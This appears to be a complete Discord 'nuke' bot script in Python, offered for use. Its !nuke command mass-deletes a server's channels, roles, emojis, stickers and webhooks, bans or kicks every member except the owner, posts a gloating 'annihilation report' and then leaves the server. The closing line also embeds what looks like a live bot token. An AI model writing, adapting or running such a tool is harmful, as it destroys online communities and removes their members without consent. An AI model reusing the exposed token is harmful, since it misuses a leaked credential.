# =============================================================================
#   ██████╗ ██╗   ██╗ ██████╗███████╗    ███████╗██╗   ██╗ ██████╗██╗  ██╗
#   ██╔══██╗██║   ██║██╔════╝██╔════╝    ██╔════╝██║   ██║██╔════╝██║ ██╔╝
#   ██████╔╝██║   ██║██║     █████╗      ███████╗██║   ██║██║     █████╔╝ 
#   ██╔══██╗██║   ██║██║     ██╔══╝      ╚════██║╚██╗ ██╔╝██║     ██╔═██╗ 
#   ██║  ██║╚██████╔╝╚██████╗███████╗    ███████║ ╚████╔╝ ╚██████╗██║  ██╗
#   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝    ╚══════╝  ╚═══╝   ╚═════╝╚═╝  ╚═╝
#
#   WARNING: This script tries to annihilate almost everything possible.
#   You will almost certainly get the bot + owning account terminated very fast.
# =============================================================================

import discord
from discord.ext import commands
import asyncio
import traceback
from datetime import datetime

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None,
    case_insensitive=True
)

NUKE_CONFIRMATION = "DESTROY_EVERYTHING_IRREVERSIBLY"

@bot.event
async def on_ready():
    print(f"[NUKE] Logged in as {bot.user} ({bot.user.id})")
    print(f"[NUKE] Ready to erase servers at {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")

@bot.command(aliases=[" obliterate", "annihilate", "doom", "rip", "deleteall"])
@commands.has_permissions(administrator=True)
@commands.bot_has_permissions(
    administrator=True,
    manage_channels=True,
    manage_roles=True,
    ban_members=True,
    kick_members=True,
    manage_emojis=True,
    manage_webhooks=True,
    manage_guild=True
)
async def nuke(ctx, *, confirmation: str = ""):

    if confirmation.strip().upper() != NUKE_CONFIRMATION:
        await ctx.send(
            f"**This command will try to destroy literally everything possible.**\n"
            f"To confirm type:\n```\n!nuke {NUKE_CONFIRMATION}\n```"
        )
        return

    guild = ctx.guild

    # ────────────────────────────────────────────────────────────────
    #   PHASE 0 – Visual/psychological warfare (optional cancer)
    # ────────────────────────────────────────────────────────────────
    try:
        for _ in range(3):
            await ctx.send("💀 **SERVER ANNIHILATION SEQUENCE STARTED** 💀")
            await asyncio.sleep(1.1)
    except:
        pass

    results = {
        "channels_deleted": 0,
        "roles_deleted": 0,
        "bans": 0,
        "kicks": 0,
        "emojis_deleted": 0,
        "stickers_deleted": 0,
        "webhooks_deleted": 0,
        "failed": []
    }

    # ────────────────────────────────────────────────────────────────
    #   PHASE 1 – Mass channel deletion (including categories, voice, threads, etc)
    # ────────────────────────────────────────────────────────────────
    for ch in list(guild.channels):
        try:
            await ch.delete(reason="mass destruction nuke")
            results["channels_deleted"] += 1
            await asyncio.sleep(0.12)   # aggressive but trying to survive longer
        except Exception as e:
            results["failed"].append(f"channel/{ch.name}: {type(e).__name__}")

    # ────────────────────────────────────────────────────────────────
    #   PHASE 2 – Mass role deletion (except @everyone + bot's top role)
    # ────────────────────────────────────────────────────────────────
    try:
        my_top_role = max(guild.me.roles, key=lambda r: r.position, default=None)
        for role in sorted(guild.roles, key=lambda r: r.position, reverse=True):
            if role.is_default() or role == my_top_role or role.managed:
                continue
            try:
                await role.delete(reason="mass destruction nuke")
                results["roles_deleted"] += 1
                await asyncio.sleep(0.35)
            except Exception as e:
                results["failed"].append(f"role/{role.name}: {type(e).__name__}")
    except:
        pass

    # ────────────────────────────────────────────────────────────────
    #   PHASE 3 – Ban / kick wave (skip owner + bots + self)
    # ────────────────────────────────────────────────────────────────
    owner_id = guild.owner_id
    me_id = bot.user.id

    members = list(guild.members)
    for member in members:
        if member.id in (owner_id, me_id) or member.bot:
            continue

        try:
            # Prefer ban when possible
            await member.ban(reason="mass destruction nuke", delete_message_days=0)
            results["bans"] += 1
            await asyncio.sleep(0.75)   # bans are very rate limited
        except discord.Forbidden:
            # fallback to kick if ban fails
            try:
                await member.kick(reason="mass destruction nuke")
                results["kicks"] += 1
                await asyncio.sleep(0.4)
            except:
                pass
        except Exception as e:
            results["failed"].append(f"member/{member}: {type(e).__name__}")

    # ────────────────────────────────────────────────────────────────
    #   PHASE 4 – Delete emojis & stickers
    # ────────────────────────────────────────────────────────────────
    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="mass destruction nuke")
            results["emojis_deleted"] += 1
            await asyncio.sleep(0.6)
        except:
            pass

    for sticker in list(guild.stickers):
        try:
            await sticker.delete(reason="mass destruction nuke")
            results["stickers_deleted"] += 1
            await asyncio.sleep(0.6)
        except:
            pass

    # ────────────────────────────────────────────────────────────────
    #   PHASE 5 – Delete webhooks
    # ────────────────────────────────────────────────────────────────
    for channel in guild.text_channels:  # only text channels have webhooks
        try:
            hooks = await channel.webhooks()
            for hook in hooks:
                try:
                    await hook.delete(reason="mass destruction nuke")
                    results["webhooks_deleted"] += 1
                    await asyncio.sleep(0.4)
                except:
                    pass
        except:
            pass

    # ────────────────────────────────────────────────────────────────
    #   PHASE 6 – Final messages & self-termination
    # ────────────────────────────────────────────────────────────────
    try:
        report = (
            f"**ANNIHILATION REPORT – {guild.name}**\n"
            f"Channels deleted: **{results['channels_deleted']}**\n"
            f"Roles deleted: **{results['roles_deleted']}**\n"
            f"Bans: **{results['bans']}**\n"
            f"Kicks: **{results['kicks']}**\n"
            f"Emojis deleted: **{results['emojis_deleted']}**\n"
            f"Stickers deleted: **{results['stickers_deleted']}**\n"
            f"Webhooks deleted: **{results['webhooks_deleted']}**\n"
            f"\nFailed actions: **{len(results['failed'])}**\n"
            "This server has been effectively erased."
        )
        await ctx.send(report[:2000])
    except:
        pass

    # Final fuck-you move — leave or try to get banned
    try:
        await guild.leave()
        print("[NUKE] Successfully left the server after destruction.")
    except:
        try:
            # Try to get ourselves banned (very likely to trigger termination)
            await guild.ban(guild.me, reason="self-termination after complete annihilation")
        except:
            pass

    print("[NUKE] Operation finished.")

# ────────────────────────────────────────────────────────────────
#   START
# ────────────────────────────────────────────────────────────────

bot.run("MTQ2ODE1MjAzMjQwMDc2OTE0NQ.GOqQg8.M8O0MTRrIu61eYr4LfPA82PYOwWgoWxs7TaJvs")
